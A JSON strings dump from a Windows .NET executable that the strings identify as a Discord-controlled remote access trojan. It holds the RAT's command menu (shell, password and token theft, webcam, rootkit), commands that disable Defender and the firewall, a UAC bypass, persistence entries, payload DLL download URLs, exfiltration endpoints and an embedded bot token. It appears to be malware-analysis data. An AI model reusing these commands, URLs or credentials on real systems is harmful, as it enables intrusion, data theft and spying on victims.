{
    "malware_data": [
        {
            "filename": "d14a609c0c3757f80eec5475e599dd2804763620290a21076905d290524231a9.exe",
            "filetype": "4D5A9000",
            "filesize": "82KB",
            "hash_sha256": "d14a609c0c3757f80eec5475e599dd2804763620290a21076905d290524231a9",
            "strings": [
                "!This program cannot be run in DOS mode.",
                ".text",
                "`.rsrc",
                "*F~&",
                "+*2~&",
                "*2(I",
                "*Vr]1",
                ",;+\\ ",
                ",x~+",
                ",~~+",
                "6kr)",
                ",6rP",
                "-e~+",
                ",l~+",
                "-f~-",
                "--~-",
                "H5)B",
                " /Ln",
                ">$; ",
                "H5);",
                "#1;O",
                "94;Z",
                "r:;d",
                "&%S5&",
                "&%S;",
                " !\\k",
                "pr+1",
                ",h~*",
                ",s(=",
                ",s(>",
                ",s(?",
                ",s(@",
                ",s(B",
                "&+`~*",
                "*BSJB",
                "v4.0.30319",
                "#Strings",
                "#GUID",
                "#Blob",
                "<SendMessageAsync>d__10",
                "<handler>d__30",
                "<GetClipboard>d__40",
                "<DisableFirewall>d__50",
                "<getprocs>d__60",
                "<select_cam>d__70",
                "<>c__DisplayClass40_0",
                "<>c__DisplayClass73_0",
                "<>c__DisplayClass9_0",
                "<GetClipboard>b__0",
                "<ReceiveLoop>b__0",
                "<CommandHandler>b__0",
                "<>p__0",
                "<Send_message>d__31",
                "<PlayAudio>d__51",
                "<LoadDll>d__61",
                "<get_cams>d__71",
                "<>8__1",
                "<>p__1",
                "<>u__1",
                "Func`1",
                "IEnumerable`1",
                "CallSite`1",
                "Task`1",
                "ICollection`1",
                "AsyncTaskMethodBuilder`1",
                "TaskAwaiter`1",
                "IEnumerator`1",
                "ArraySegment`1",
                "List`1",
                "get_Item1",
                "<>7__wrap1",
                "<Send_attachment>d__32",
                "Microsoft.Win32",
                "UInt32",
                "ToInt32",
                "<password>d__62",
                "<>o__62",
                "<get_tokens>d__72",
                "<data>5__2",
                "<path>5__2",
                "<stream>5__2",
                "<loopToken>5__2",
                "<selection>5__2",
                "<httpClient>5__2",
                "<biggest>5__2",
                "<>p__2",
                "<>u__2",
                "Func`2",
                "Tuple`2",
                "KeyValuePair`2",
                "IDictionary`2",
                "get_Item2",
                "<>7__wrap2",
                "<GetScreenshot>d__43",
                "<sendpassword>d__63",
                "<CommandHandler>d__73",
                "<buffer>5__3",
                "<httpClient>5__3",
                "<multipartFormContent>5__3",
                "<>p__3",
                "<>u__3",
                "Func`3",
                "<Responsehandler>d__24",
                "<ShellCommand>d__34",
                "<Delete>d__44",
                "<new_channel_id>5__4",
                "<httpClient>5__4",
                "<>p__4",
                "<>u__4",
                "<>7__wrap4",
                "<Speak>d__35",
                "<Kill>d__45",
                "<>u__5",
                "Func`5",
                "<MainAsync>d__26",
                "<dir>d__36",
                "<uacbypass>d__46",
                "<Rootkit>d__66",
                "<WaitUtillDead>d__6",
                "<heartbeat>d__27",
                "<upload>d__37",
                "<UnRootkit>d__67",
                "<ConnectAsync>d__7",
                "<login>d__28",
                "<LinkToBytes>d__38",
                "<ProcKill>d__48",
                "<geolocate>d__58",
                "<helpmenu>d__68",
                "get_UTF8",
                "<DisconnectAsync>d__8",
                "<CreateHostingChannel>d__29",
                "<BytesToWallpaper>d__39",
                "<DisableDefender>d__49",
                "<getip>d__59",
                "<webcampic>d__69",
                "<ReceiveLoop>d__9",
                "<Module>",
                "<PrivateImplementationDetails>",
                "SPIF_SENDCHANGE",
                "SPIF_UPDATEINIFILE",
                "LASTINPUTINFO",
                "System.IO",
                "SPI_SETDESKWALLPAPER",
                "get_X",
                "get_Y",
                "System.Media",
                "message_data",
                "mscorlib",
                "webcampic",
                "System.Collections.Generic",
                "SendAsync",
                "SendMessageAsync",
                "CloseAsync",
                "DeleteAsync",
                "ReceiveAsync",
                "ReadAsStringAsync",
                "MainAsync",
                "CopyToAsync",
                "ConnectAsync",
                "DisconnectAsync",
                "GetAsync",
                "PostAsync",
                "CloseOutputAsync",
                "uncritproc",
                "get_Id",
                "GuildId",
                "ChannelId",
                "WaitUtillDead",
                "Read",
                "Thread",
                "Load",
                "upload",
                "connected",
                "AwaitUnsafeOnCompleted",
                "get_IsCompleted",
                "get_IsCancellationRequested",
                "ResponseReceived",
                "Guildid",
                "channelid",
                "rootkitaddpid",
                "<ReceiveBufferSize>k__BackingField",
                "GetField",
                "ReadToEnd",
                "ShellCommand",
                "command",
                "RegistryValueKind",
                "GetMethod",
                "GetClipboard",
                "sendpassword",
                "SetOutputToDefaultAudioDevice",
                "CreateInstance",
                "CancellationTokenSource",
                "EnsureSuccessStatusCode",
                "EnterDebugMode",
                "FromImage",
                "HttpResponseMessage",
                "get_EndOfMessage",
                "Send_message",
                "IsThreadPrivilege",
                "bEnablePrivilege",
                "RtlAdjustPrivilege",
                "Invoke",
                "GetEnvironmentVariable",
                "SetEnvironmentVariable",
                "Enumerable",
                "IDisposable",
                "get_Handle",
                "RuntimeTypeHandle",
                "GetTypeFromHandle",
                "Rectangle",
                "File",
                "IsInRole",
                "WindowsBuiltInRole",
                "Console",
                "Tuple",
                "set_WindowStyle",
                "ProcessWindowStyle",
                "set_FileName",
                "GetRandomFileName",
                "GetTempFileName",
                "GetFileName",
                "get_UserName",
                "get_ProcessName",
                "procname",
                "GetIdleTime",
                "DateTime",
                "GetLastInputTime",
                "dwTime",
                "WriteLine",
                "IAsyncStateMachine",
                "SetStateMachine",
                "stateMachine",
                "LocalMachine",
                "get_None",
                "get_MessageType",
                "WebSocketMessageType",
                "ValueType",
                "GetType",
                "Where",
                "System.Core",
                "picture",
                "MethodBase",
                "Response",
                "Close",
                "Dispose",
                "Parse",
                "geolocate",
                "Create",
                "get_State",
                "WebSocketState",
                "SetApartmentState",
                "<>1__state",
                "Delete",
                "CallSite",
                "Write",
                "STAThreadAttribute",
                "CompilerGeneratedAttribute",
                "GuidAttribute",
                "UnverifiableCodeAttribute",
                "DebuggableAttribute",
                "ComVisibleAttribute",
                "AssemblyTitleAttribute",
                "AsyncStateMachineAttribute",
                "AssemblyTrademarkAttribute",
                "TargetFrameworkAttribute",
                "DebuggerHiddenAttribute",
                "AssemblyFileVersionAttribute",
                "AssemblyConfigurationAttribute",
                "AssemblyDescriptionAttribute",
                "CompilationRelaxationsAttribute",
                "AssemblyProductAttribute",
                "AssemblyCopyrightAttribute",
                "AssemblyCompanyAttribute",
                "RuntimeCompatibilityAttribute",
                "set_UseShellExecute",
                "Byte",
                "DeleteValue",
                "PreviousValue",
                "GetValue",
                "SetValue",
                "value",
                "Save",
                "Discord rat.exe",
                "get_Size",
                "cbSize",
                "get_ReceiveBufferSize",
                "set_ReceiveBufferSize",
                "Serialize",
                "Deserialize",
                "SizeOf",
                "get_Png",
                "System.Threading",
                "Encoding",
                "System.Drawing.Imaging",
                "System.Runtime.Versioning",
                "ToString",
                "System.Drawing",
                "System.Speech",
                "ComputeStringHash",
                "Path",
                "rootkitaddpath",
                "filepath",
                "get_Width",
                "get_Length",
                "processInformationLength",
                "StartsWith",
                "plii",
                "fuWinIni",
                "Speak",
                "link",
                "UnicodeStringParameterMask",
                "get_Task",
                "Marshal",
                "System.Security.Principal",
                "WindowsPrincipal",
                "CreateHostingChannel",
                "LoadDll",
                "DisableFirewall",
                "Kernel32.dll",
                "User32.dll",
                "user32.dll",
                "ntdll.dll",
                "ProcKill",
                "select_cam",
                "inputStream",
                "outputStream",
                "MemoryStream",
                "uParam",
                "lpvParam",
                "Program",
                "get_Item",
                "set_Item",
                "System",
                "Boolean",
                "TimeSpan",
                "CopyFromScreen",
                "get_PrimaryScreen",
                "Bluescreen",
                "get_Token",
                "CancellationToken",
                "BotToken",
                "Bottoken",
                "Main",
                "login",
                "addstartupnonadmin",
                "addstartupadmin",
                "Join",
                "session",
                "Application",
                "get_Location",
                "processInformation",
                "CopyPixelOperation",
                "System.Web.Script.Serialization",
                "uAction",
                "System.Reflection",
                "KeyCollection",
                "set_Position",
                "ValidResponseOption",
                "SearchOption",
                "SetException",
                "DictionaryToJson",
                "json",
                "FieldInfo",
                "MethodInfo",
                "ParameterInfo",
                "SystemParametersInfo",
                "CSharpArgumentInfo",
                "get_StartInfo",
                "set_StartInfo",
                "ProcessStartInfo",
                "GetLastInputInfo",
                "PlayAudio",
                "audio",
                "Zero",
                "Bitmap",
                "Skip",
                "getip",
                "ReceiveLoop",
                "Microsoft.CSharp",
                "System.Net.Http",
                "System.Linq",
                "Char",
                "InvokeMember",
                "number",
                "StreamReader",
                "TextReader",
                "AsyncTaskMethodBuilder",
                "<>t__builder",
                "session_channel_holder",
                "dll_holder",
                "dll_url_holder",
                "activator_holder",
                "DisableDefender",
                "Microsoft.CSharp.RuntimeBinder",
                "CallSiteBinder",
                "EnableTaskManager",
                "DisableTaskManager",
                "HttpMessageInvoker",
                "CommandHandler",
                "Responsehandler",
                "TaskScheduler",
                "BytesToWallpaper",
                "CurrentUser",
                "CancelAfter",
                "TaskAwaiter",
                "GetAwaiter",
                "ToLower",
                "SoundPlayer",
                "JavaScriptSerializer",
                "serializer",
                "SpeechSynthesizer",
                "NtRaiseHardError",
                "set_RedirectStandardError",
                "GetLastError",
                "IEnumerator",
                "GetEnumerator",
                "Activator",
                ".ctor",
                ".cctor",
                "IntPtr",
                "Graphics",
                "System.Diagnostics",
                "getprocs",
                "FromSeconds",
                "milliseconds",
                "get_Bounds",
                "System.Runtime.InteropServices",
                "System.Runtime.CompilerServices",
                "DebuggingModes",
                "GetFileSystemEntries",
                "filenames",
                "GetProcesses",
                "ReadAllBytes",
                "WriteAllBytes",
                "StringToBytes",
                "LinkToBytes",
                "GetBytes",
                "BindingFlags",
                "CSharpArgumentInfoFlags",
                "CSharpBinderFlags",
                "settings",
                "args",
                "<>4__this",
                "System.Speech.Synthesis",
                "System.Threading.Tasks",
                "attachment_urls",
                "get_cams",
                "System.Windows.Forms",
                "get_tokens",
                "System.Web.Extensions",
                "System.Collections",
                "TaskCreationOptions",
                "get_Chars",
                "System.Net.Http.Headers",
                "HttpHeaders",
                "HttpRequestHeaders",
                "get_DefaultRequestHeaders",
                "NumberOfParameters",
                "GetParameters",
                "processInformationClass",
                "uacbypass",
                "hProcess",
                "NtSetInformationProcess",
                "GetCurrentProcess",
                "System.Net.WebSockets",
                "attachments",
                "set_Arguments",
                "WebSocketCloseStatus",
                "ErrorStatus",
                "get_Keys",
                "SendKeys",
                "fBlockIt",
                "Concat",
                "heartbeat",
                "ImageFormat",
                "PixelFormat",
                "Discord rat",
                "Discord_rat",
                "Object",
                "dict",
                "EnvironmentVariableTarget",
                "ClientWebSocket",
                "get_Height",
                "SendWait",
                "IsDigit",
                "UnRootkit",
                "Split",
                "WaitForExit",
                "get_Default",
                "WebSocketReceiveResult",
                "DialogResult",
                "GetResult",
                "SetResult",
                "HttpClient",
                "WsClient",
                "client",
                "Send_attachment",
                "Environment",
                "get_Current",
                "GetCurrent",
                "get_Content",
                "MultipartFormDataContent",
                "StringContent",
                "HttpContent",
                "ByteArrayContent",
                "message_content",
                "get_EntryPoint",
                "get_Count",
                "get_TickCount",
                "GetScreenshot",
                "Prompt",
                "ThreadStart",
                "Convert",
                "BlockInput",
                "input",
                "get_StandardOutput",
                "set_RedirectStandardOutput",
                "MoveNext",
                "System.Text",
                "GetText",
                "helpmenu",
                "StartNew",
                "get_Now",
                "set_CreateNoWindow",
                "Show",
                "threadEx",
                "MessageBox",
                "Play",
                "Delay",
                "ObjectToArray",
                "ToCharArray",
                "CreateSubKey",
                "OpenSubKey",
                "ContainsKey",
                "RegistryKey",
                "GetEntryAssembly",
                "JsonToDictionary",
                "ObjectToDictionary",
                "get_Factory",
                "TaskFactory",
                "GetCurrentDirectory",
                "SetCurrentDirectory",
                "Registry",
                "op_Equality",
                "op_Inequality",
                "System.Security",
                "WindowsIdentity",
                "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "SkipVerification",
                "WrapNonExceptionThrows",
                "Copyright ",
                "  2022",
                "$cc12258f-af24-4773-a8e3-45d365bcbde9",
                "1.0.0.0",
                ".NETFramework,Version=v4.6.1",
                "FrameworkDisplayName",
                ".NET Framework 4.6.1",
                "(Discord_rat.WsClient+<WaitUtillDead>d__6",
                "'Discord_rat.WsClient+<ConnectAsync>d__7",
                "*Discord_rat.WsClient+<DisconnectAsync>d__8",
                "&Discord_rat.WsClient+<ReceiveLoop>d__9",
                ",Discord_rat.WsClient+<SendMessageAsync>d__10",
                "*Discord_rat.Program+<Responsehandler>d__24",
                "$Discord_rat.Program+<MainAsync>d__26",
                "$Discord_rat.Program+<heartbeat>d__27",
                " Discord_rat.Program+<login>d__28",
                "/Discord_rat.Program+<CreateHostingChannel>d__29",
                "\"Discord_rat.Program+<handler>d__30",
                "'Discord_rat.Program+<Send_message>d__31",
                "*Discord_rat.Program+<Send_attachment>d__32",
                "'Discord_rat.Program+<ShellCommand>d__34",
                " Discord_rat.Program+<Speak>d__35",
                "Discord_rat.Program+<dir>d__36",
                "!Discord_rat.Program+<upload>d__37",
                "&Discord_rat.Program+<LinkToBytes>d__38",
                "+Discord_rat.Program+<BytesToWallpaper>d__39",
                "'Discord_rat.Program+<GetClipboard>d__40",
                "(Discord_rat.Program+<GetScreenshot>d__43",
                "!Discord_rat.Program+<Delete>d__44",
                "Discord_rat.Program+<Kill>d__45",
                "$Discord_rat.Program+<uacbypass>d__46",
                "#Discord_rat.Program+<ProcKill>d__48",
                "*Discord_rat.Program+<DisableDefender>d__49",
                "*Discord_rat.Program+<DisableFirewall>d__50",
                "$Discord_rat.Program+<PlayAudio>d__51",
                "$Discord_rat.Program+<geolocate>d__58",
                " Discord_rat.Program+<getip>d__59",
                "#Discord_rat.Program+<getprocs>d__60",
                "\"Discord_rat.Program+<LoadDll>d__61",
                "#Discord_rat.Program+<password>d__62",
                "'Discord_rat.Program+<sendpassword>d__63",
                "\"Discord_rat.Program+<Rootkit>d__66",
                "$Discord_rat.Program+<UnRootkit>d__67",
                "#Discord_rat.Program+<helpmenu>d__68",
                "$Discord_rat.Program+<webcampic>d__69",
                "%Discord_rat.Program+<select_cam>d__70",
                "#Discord_rat.Program+<get_cams>d__71",
                "%Discord_rat.Program+<get_tokens>d__72",
                ")Discord_rat.Program+<CommandHandler>d__73",
                "IHDR",
                "PLTE",
                "YHD=",
                "tRNS",
                "IDATx",
                "b[IcK",
                "OGH'",
                "pj=~",
                "Sc5\"A",
                "|xAb",
                "OGHW",
                "+Jn_",
                "fsYF",
                "Ou&m5",
                "VF\\X",
                "-zmYC",
                "PP=9g",
                "!-V2",
                "+%@5",
                "z'F[I",
                "K@yr",
                "{+\\UR",
                " '1;a",
                "7\\|/%",
                ":;;H",
                "C@8V",
                "8!@X",
                "IEND",
                "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
                "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">",
                "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>",
                "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">",
                "    <security>",
                "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">",
                "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>",
                "      </requestedPrivileges>",
                "    </security>",
                "  </trustInfo>",
                "</assembly>",
                ") )!)\")#)$)%)&)()))*)+),)-).)/)0)2)",
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "DisableTaskMgr",
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/create /tn \"{1}\" /tr \"'{0}'\" /sc onlogon /rl HIGHEST",
                "SCHTASKS.exe",
                "SOFTWARE\\$77config\\pid",
                "SOFTWARE\\$77config\\paths",
                "unset",
                "password",
                "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/PasswordStealer.dll",
                "rootkit",
                "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll",
                "unrootkit",
                "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/unrootkit.dll",
                "webcam",
                "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Webcam.dll",
                "token",
                "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Token%20grabber.dll",
                "wss://gateway.discord.gg/?v=9&encording=json",
                "intents",
                "properties",
                "linux",
                "browser",
                "chrome",
                "device",
                "channels",
                "type",
                "name",
                "session-",
                "https://discord.com/api/v9/guilds/{0}/channels",
                "authorization",
                "Bot ",
                "application/json",
                "@here :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}",
                "heartbeat_interval",
                "recived heartbeat",
                "READY",
                "GUILD_CREATE",
                "MESSAGE_CREATE",
                "CHANNEL_CREATE",
                "CHANNEL_DELETE",
                "user",
                "username",
                "discriminator",
                "guild_id",
                "channel_id",
                "content",
                "author",
                "https://discord.com/api/v9/channels/{0}/messages",
                "files[{0}]",
                "cmd.exe",
                "output.txt",
                "Command executed!",
                "File not found!",
                "File larger than 8mb, please wait while we upload to a third party!",
                "file",
                "https://file.io/",
                "success",
                "File uploaded, heres the download link!",
                "Error with uploading file!",
                ".png",
                "Error writing file!",
                "Error setting wallpaper!",
                "Error getting clipboard!",
                "Clipboard empty!",
                "screenshot.png",
                "https://discord.com/api/v9/channels/",
                "windir",
                "\" ;#",
                "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I",
                "Error with uacbypass!",
                "systemdrive",
                "\\Windows",
                "powershell.exe",
                "-Command Add-MpPreference -ExclusionPath \"C:\\\"",
                "NetSh.exe",
                "Advfirewall set allprofiles state off",
                "https://geolocation-db.com/json",
                "http://www.google.com/maps/place/{0},{1}",
                "latitude",
                "longitude",
                "IPv4",
                "PasswordStealer.Stealer",
                "password.txt",
                "Error executing rootkit!",
                "Error removing rootkit!",
                "--> !message = Show a message box displaying your text / Syntax  = \"!message example\"",
                "--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"",
                "--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"",
                "--> !admincheck = Check if program has admin privileges",
                "--> !cd = Changes directory",
                "--> !dir = display all items in current dir",
                "--> !download = Download a file from infected computer",
                "--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)",
                "--> !uploadlink = Upload file to the infected computer / Syntax = \"!upload link file.png\"",
                "--> !delete = deletes a file / Syntax = \"!delete / path to / the / file.txt\"",
                "--> !write = Type your desired sentence on computer",
                "--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)",
                "--> !clipboard = Retrieve infected computer clipboard content",
                "--> !idletime = Get the idle time of user's on target computer",
                "--> !currentdir = display the current dir",
                "--> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required",
                "--> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required",
                "--> !screenshot = Get the screenshot of the user's current screen",
                "--> !exit = Exit program",
                "--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"",
                "--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui",
                "--> !shutdown = shutdown computer",
                "--> !restart = restart computer",
                "--> !logoff = log off current user",
                "--> !bluescreen = BlueScreen PC",
                "--> !datetime = display system date and time",
                "--> !prockill = kill a process by name / syntax = \"!kill process\"",
                "--> !disabledefender = Disable windows defender(requires admin)",
                "--> !disablefirewall = Disable windows firewall(requires admin)",
                "--> !audio = play a audio file on the target computer / Syntax = \"!audio\" (with attachment)",
                "--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)",
                "--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)",
                "--> !website = open a website on the infected computer / syntax = \"!website www.google.com\"",
                "--> !disabletaskmgr = disable task manager(Admin rights are required)",
                "--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)",
                "--> !startup = add to startup(when computer go on this file starts)",
                "--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise",
                "--> !listprocess = Get all process's",
                "--> !password = grab all passwords",
                "--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)",
                "--> !unrootkit = Remove the rootkit(Admin rights are required)",
                "--> !getcams = Grab the cameras names and their respected selection number",
                "--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax \"!selectcam 1\"",
                "--> !webcampic = Take a picture out of the selected webcam",
                "--> !grabtokens = Grab all discord tokens on the current pc",
                "--> !help = This help menu",
                "help.txt",
                "Webcam.webcam",
                "init",
                "cameras",
                "No cameras found!",
                "GetImage",
                "webcam.jpg",
                "Error taking picture!",
                "Error that is not a number!",
                "select",
                "Error that is a invalid selection!",
                "Selected onto camera ",
                "GetWebcams",
                "webcams.txt",
                "Token_grabber.grabber",
                "grab",
                "tokens.txt",
                "!grabtokens",
                "!getcams",
                "!selectcam",
                "!webcampic",
                "!message",
                "!shell",
                "!voice",
                "!admincheck",
                "!dir",
                "!download",
                "!upload",
                "!uploadlink",
                "!delete",
                "!write",
                "!wallpaper",
                "!clipboard",
                "!idletime",
                "!currentdir",
                "!block",
                "!unblock",
                "!screenshot",
                "!exit",
                "!kill",
                "!uacbypass",
                "!shutdown",
                "!restart",
                "!logoff",
                "!bluescreen",
                "!datetime",
                "!prockill",
                "!disabledefender",
                "!disablefirewall",
                "!audio",
                "!critproc",
                "!uncritproc",
                "!website",
                "!disabletaskmgr",
                "!enabletaskmgr",
                "!startup",
                "!geolocate",
                "!listprocess",
                "!password",
                "!rootkit",
                "!unrootkit",
                "!help",
                "Could not find attachment!",
                "Could not find filename or link!",
                "Error deleting file!",
                "Could not find filename!",
                "You dont have admin!",
                "shutdown",
                "/s /t 0",
                "/r /t 0",
                "MM\\/dd\\/yyyy h\\:mm tt",
                "MTE4NzkxODczMDE4NTk0NTE0OA.G66vie.kA0nLo-eD-2rd6nK3M-Fh4qAb4220iowO4cbo4",
                "1187724075263598592",
                "JPG-63",
                "VS_VERSION_INFO",
                "VarFileInfo",
                "Translation",
                "StringFileInfo",
                "000004b0",
                "Comments",
                "CompanyName",
                "FileDescription",
                "FileVersion",
                "InternalName",
                "LegalCopyright",
                "LegalTrademarks",
                "OriginalFilename",
                "ProductName",
                "ProductVersion",
                "Assembly Version"
            ]
        }
    ]
}